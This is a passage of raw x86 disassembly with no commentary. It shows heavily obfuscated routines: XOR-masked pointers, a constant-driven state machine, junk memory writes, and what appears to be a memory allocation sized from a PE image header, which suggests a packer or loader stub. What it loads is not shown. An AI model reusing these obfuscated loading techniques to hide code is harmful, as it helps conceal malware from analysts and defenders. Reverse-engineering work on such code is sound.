  42728b:	mov    ecx,DWORD PTR [ebp-0xc]
  42728e:	mov    ecx,DWORD PTR [ecx]
  427290:	xor    ecx,edi
  427292:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427299:	cmp    cl,al
  42729b:	jne    0x427375
  4272a1:	mov    eax,DWORD PTR [ebp+0xc]
  4272a4:	mov    eax,DWORD PTR [eax]
  4272a6:	xor    eax,edi
  4272a8:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272af:	mov    ecx,DWORD PTR [ebp-0x10]
  4272b2:	mov    ecx,DWORD PTR [ecx]
  4272b4:	xor    ecx,edi
  4272b6:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272bd:	xor    al,cl
  4272bf:	mov    ecx,DWORD PTR [ebp-0x14]
  4272c2:	mov    ecx,DWORD PTR [ecx]
  4272c4:	xor    ecx,edi
  4272c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272cd:	or     al,cl
  4272cf:	mov    ecx,DWORD PTR [ebp-0x10]
  4272d2:	mov    ecx,DWORD PTR [ecx]
  4272d4:	xor    ecx,edi
  4272d6:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4272dd:	cmp    cl,al
  4272df:	jne    0x427375
  4272e5:	mov    eax,DWORD PTR [ebp-0x14]
  4272e8:	mov    eax,DWORD PTR [eax]
  4272ea:	xor    eax,edi
  4272ec:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272f3:	mov    ecx,DWORD PTR [ebp+0xc]
  4272f6:	mov    ecx,DWORD PTR [ecx]
  4272f8:	xor    ecx,edi
  4272fa:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427301:	xor    al,cl
  427303:	mov    ecx,DWORD PTR [ebp-0xc]
  427306:	mov    ecx,DWORD PTR [ecx]
  427308:	xor    ecx,edi
  42730a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427311:	or     al,cl
  427313:	mov    ecx,DWORD PTR [ebp+0xc]
  427316:	mov    ecx,DWORD PTR [ecx]
  427318:	xor    ecx,edi
  42731a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427321:	cmp    cl,al
  427323:	jne    0x427375
  427325:	mov    eax,DWORD PTR [ebp-0x14]
  427328:	mov    eax,DWORD PTR [eax]
  42732a:	xor    eax,edi
  42732c:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  427333:	mov    ecx,DWORD PTR [ebp-0xc]
  427336:	mov    ecx,DWORD PTR [ecx]
  427338:	xor    ecx,edi
  42733a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427341:	xor    al,cl
  427343:	mov    ecx,DWORD PTR [ebp-0x10]
  427346:	mov    ecx,DWORD PTR [ecx]
  427348:	xor    ecx,edi
  42734a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427351:	or     al,cl
  427353:	mov    ecx,DWORD PTR [ebp-0x14]
  427356:	mov    ecx,DWORD PTR [ecx]
  427358:	xor    ecx,edi
  42735a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427361:	cmp    cl,al
  427363:	jne    0x427375
  427365:	lea    eax,[ebp-0x4c]
  427368:	push   eax
  427369:	call   0x426e30
  42736e:	mov    ecx,DWORD PTR [ebp-0x44]
  427371:	cmp    eax,ecx
  427373:	je     0x42737f
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp-0x8]
  427382:	xor    eax,edi
  427384:	lea    eax,[eax+esi*1+0x3272ec]
  42738b:	xor    eax,edi
  42738d:	mov    ecx,DWORD PTR [ebp+0x8]
  427390:	mov    edx,DWORD PTR [ebp+0x18]
  427393:	xor    ecx,edi
  427395:	add    ecx,ebx
  427397:	cmp    edx,ecx
  427399:	je     0x427196
  42739f:	mov    eax,DWORD PTR [ebp+0x8]
  4273a2:	mov    ecx,DWORD PTR [ebp+0x18]
  4273a5:	xor    eax,edi
  4273a7:	add    eax,ebx
  4273a9:	cmp    ecx,eax
  4273ab:	jne    0x4273be
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	lea    eax,[eax+ecx*1+0x3272ec]
  4273bc:	jmp    0x427435
  4273be:	push   0x18
  4273c0:	push   DWORD PTR [ebp-0x4]
  4273c3:	lea    eax,[ebp-0x64]
  4273c6:	push   eax
  4273c7:	call   0x4266a9
  4273cc:	mov    eax,DWORD PTR [ebp+0x8]
  4273cf:	mov    ecx,DWORD PTR [ebp-0x18]
  4273d2:	xor    eax,edi
  4273d4:	add    eax,ebx
  4273d6:	cmp    eax,ecx
  4273d8:	je     0x4273ed
  4273da:	mov    eax,DWORD PTR [ebp+0x8]
  4273dd:	xor    eax,edi
  4273df:	add    eax,ebx
  4273e1:	push   eax
  4273e2:	push   0x18
  4273e4:	lea    eax,[ebp-0x64]
  4273e7:	push   eax
  4273e8:	call   0x426c8f
  4273ed:	mov    eax,DWORD PTR [ebp-0x4]
  4273f0:	add    eax,0x18
  4273f3:	mov    DWORD PTR [ebp+0x18],eax
  4273f6:	push   DWORD PTR [ebp-0x50]
  4273f9:	push   DWORD PTR [ebp+0x18]
  4273fc:	mov    eax,DWORD PTR [ebp-0x54]
  4273ff:	add    eax,DWORD PTR [ebp-0x20]
  427402:	push   eax
  427403:	call   0x4266a9
  427408:	mov    eax,DWORD PTR [ebp+0x8]
  42740b:	mov    ecx,DWORD PTR [ebp-0x18]
  42740e:	xor    eax,edi
  427410:	add    eax,ebx
  427412:	cmp    eax,ecx
  427414:	je     0x427427
  427416:	push   0x0
  427418:	push   DWORD PTR [ebp-0x50]
  42741b:	mov    eax,DWORD PTR [ebp-0x54]
  42741e:	add    eax,DWORD PTR [ebp-0x20]
  427421:	push   eax
  427422:	call   0x426c8f
  427427:	mov    eax,DWORD PTR [ebp-0x24]
  42742a:	mov    ecx,DWORD PTR [ebp-0x50]
  42742d:	add    DWORD PTR [eax],ecx
  42742f:	mov    eax,DWORD PTR [ebp-0x50]
  427432:	add    eax,DWORD PTR [ebp+0x1c]
  427435:	mov    DWORD PTR [ebp+0x1c],eax
  427438:	mov    eax,DWORD PTR [ebp-0x8]
  42743b:	mov    ecx,DWORD PTR [ebp+0x1c]
  42743e:	xor    eax,edi
  427440:	add    eax,ebx
  427442:	imul   eax,ecx
  427445:	mov    ecx,DWORD PTR [ebp+0x8]
  427448:	mov    edx,DWORD PTR [ebp-0x28]
  42744b:	xor    ecx,edi
  42744d:	lea    ecx,[ecx+edx*1+0x3272ec]
  427454:	cmp    eax,ecx
  427456:	jb     0x4270b4
  42745c:	mov    esi,DWORD PTR [ebp+0x14]
  42745f:	mov    eax,DWORD PTR [ebp-0x20]
  427462:	mov    DWORD PTR [esi],eax
  427464:	jmp    0x4274ab
  427466:	mov    ecx,DWORD PTR [ebp+0x8]
  427469:	mov    edx,DWORD PTR [ebp+0xc]
  42746c:	xor    ecx,edi
  42746e:	xor    edx,edi
  427470:	add    ecx,ebx
  427472:	add    edx,ebx
  427474:	cmp    ecx,edx
  427476:	jne    0x42748a
  427478:	mov    eax,ds:0x7f642ddf
  42747d:	imul   eax,eax,0x9f15fcce
  427483:	mov    ds:0x7f642ddf,eax
  427488:	jmp    0x4274ab
  42748a:	mov    ecx,DWORD PTR [ebp+0x8]
  42748d:	xor    ecx,edi
  42748f:	add    ecx,ebx
  427491:	cmp    eax,ecx
  427493:	je     0x4274a1
  427495:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  42749f:	jmp    0x4274ab
  4274a1:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  4274ab:	pop    edi
  4274ac:	pop    esi
  4274ad:	pop    ebx
  4274ae:	leave  
  4274af:	ret    0x18
  4274b2:	push   ebp
  4274b3:	mov    ebp,esp
  4274b5:	and    esp,0xfffffff8
  4274b8:	mov    eax,DWORD PTR [ebp+0x20]
  4274bb:	sub    esp,0x14
  4274be:	push   ebx
  4274bf:	mov    ebx,DWORD PTR [ebp+0x14]
  4274c2:	push   esi
  4274c3:	push   edi
  4274c4:	cmp    eax,0xf89c85b0
  4274c9:	jne    0x4274d5
  4274cb:	push   0xf89c85b1
  4274d0:	jmp    0x427607
  4274d5:	mov    eax,DWORD PTR [ebp+0x20]
  4274d8:	cmp    eax,0xf89c85b1
  4274dd:	jne    0x4274e9
  4274df:	push   0xf89c85b2
  4274e4:	jmp    0x427607
  4274e9:	mov    eax,DWORD PTR [ebp+0x20]
  4274ec:	cmp    eax,0xf89c85b2
  4274f1:	jne    0x4274fd
  4274f3:	push   0xf89c85b3
  4274f8:	jmp    0x427607
  4274fd:	mov    eax,DWORD PTR [ebp+0x20]
  427500:	cmp    eax,0xf89c85b3
  427505:	jne    0x427511
  427507:	push   0xf89c85bc
  42750c:	jmp    0x427607
  427511:	mov    ecx,DWORD PTR [ebp+0x20]
  427514:	mov    eax,0xf89c85bf
  427519:	cmp    ecx,eax
  42751b:	jne    0x4275d7
  427521:	mov    eax,DWORD PTR [ebp+0x10]
  427524:	mov    DWORD PTR [esp+0xc],eax
  427528:	mov    eax,DWORD PTR [ebp+0x18]
  42752b:	mov    DWORD PTR [esp+0x14],eax
  42752f:	mov    eax,DWORD PTR [ebp+0xc]
  427532:	mov    DWORD PTR [esp+0x18],eax
  427536:	mov    eax,DWORD PTR [ebp+0x8]
  427539:	mov    DWORD PTR [esp+0x10],eax
  42753d:	mov    eax,DWORD PTR [esp+0x10]
  427541:	mov    ecx,DWORD PTR [esp+0x14]
  427545:	mov    edi,0x75108a4
  42754a:	xor    eax,edi
  42754c:	mov    esi,0x3272ec
  427551:	add    eax,esi
  427553:	mov    DWORD PTR [ecx],eax
  427555:	mov    eax,DWORD PTR [esp+0xc]
  427559:	mov    eax,DWORD PTR [eax+0x194]
  42755f:	mov    ecx,DWORD PTR [eax]
  427561:	mov    eax,DWORD PTR [esp+0xc]
  427565:	mov    eax,DWORD PTR [eax+0x194]
  42756b:	mov    eax,DWORD PTR [eax]
  42756d:	add    eax,DWORD PTR [ecx+0x3c]
  427570:	mov    ecx,DWORD PTR [esp+0xc]
  427574:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42757a:	mov    ecx,DWORD PTR [ecx+0x14]
  42757d:	push   0x4
  42757f:	push   0x3000
  427584:	push   DWORD PTR [eax+0x50]
  427587:	push   0x0
  427589:	call   ecx
  42758b:	mov    DWORD PTR [ebx],eax
  42758d:	mov    eax,DWORD PTR [esp+0x10]
  427591:	push   DWORD PTR [esp+0xc]
  427595:	xor    eax,edi
  427597:	add    eax,esi
  427599:	mov    DWORD PTR [esp+0x20],eax
  42759d:	lea    eax,[esp+0x20]
  4275a1:	push   eax
  4275a2:	push   ebx
  4275a3:	push   DWORD PTR [esp+0x20]
  4275a7:	push   DWORD PTR [esp+0x28]
  4275ab:	push   DWORD PTR [esp+0x24]
  4275af:	call   0x426f74
  4275b4:	mov    eax,DWORD PTR [esp+0x10]
  4275b8:	mov    ecx,DWORD PTR [ebx]
  4275ba:	xor    eax,edi
  4275bc:	add    eax,esi
  4275be:	cmp    ecx,eax
  4275c0:	je     0x42761e
  4275c2:	mov    eax,DWORD PTR [esp+0x18]
  4275c6:	mov    ecx,DWORD PTR [esp+0x14]
  4275ca:	xor    eax,edi
  4275cc:	add    eax,esi
  4275ce:	imul   eax,DWORD PTR [esp+0x1c]
  4275d3:	mov    DWORD PTR [ecx],eax
  4275d5:	jmp    0x42761e
  4275d7:	mov    ecx,DWORD PTR [ebp+0x20]
  4275da:	cmp    ecx,0xf89c85bc
  4275e0:	jne    0x4275e9
  4275e2:	push   0xf89c85bd
  4275e7:	jmp    0x427607
  4275e9:	mov    ecx,DWORD PTR [ebp+0x20]
  4275ec:	cmp    ecx,0xf89c85bd
  4275f2:	jne    0x4275fb
  4275f4:	push   0xf89c85be
  4275f9:	jmp    0x427607
  4275fb:	mov    ecx,DWORD PTR [ebp+0x20]
  4275fe:	cmp    ecx,0xf89c85be
  427604:	jne    0x42761e
  427606:	push   eax
  427607:	push   DWORD PTR [ebp+0x1c]
  42760a:	push   DWORD PTR [ebp+0x18]
  42760d:	push   ebx
  42760e:	push   DWORD PTR [ebp+0x10]
  427611:	push   DWORD PTR [ebp+0xc]
  427614:	push   DWORD PTR [ebp+0x8]
  427617:	call   0x4274b2
  42761c:	mov    DWORD PTR [ebx],eax
  42761e:	mov    eax,DWORD PTR [ebx]
  427620:	pop    edi
  427621:	pop    esi
  427622:	pop    ebx
  427623:	mov    esp,ebp
  427625:	pop    ebp
  427626:	ret    0x1c
  427629:	push   ebp
  42762a:	mov    ebp,esp
  42762c:	sub    esp,0xc
  42762f:	mov    eax,0xf89c85b0
  427634:	mov    DWORD PTR [ebp-0x8],eax
  427637:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  42763e:	mov    ecx,DWORD PTR [ebp-0x8]
  427641:	xor    ecx,0x75108a4
  427647:	add    ecx,0x3272ec
  42764d:	mov    DWORD PTR [ebp-0x4],ecx
  427650:	mov    ecx,DWORD PTR [ebp+0xc]
  427653:	push   eax
  427654:	mov    DWORD PTR [ebp+0xc],ecx
  427657:	push   DWORD PTR [ebp+0xc]
  42765a:	lea    eax,[ebp-0x4]
  42765d:	push   DWORD PTR [ebp+0x8]
  427660:	push   eax
  427661:	push   DWORD PTR [ebp+0xc]
  427664:	push   DWORD PTR [ebp-0xc]
  427667:	push   DWORD PTR [ebp-0x8]
  42766a:	call   0x4274b2
  42766f:	mov    DWORD PTR [ebp-0x4],eax
  427672:	mov    eax,DWORD PTR [ebp-0x4]
  427675:	leave  
  427676:	ret    0x8
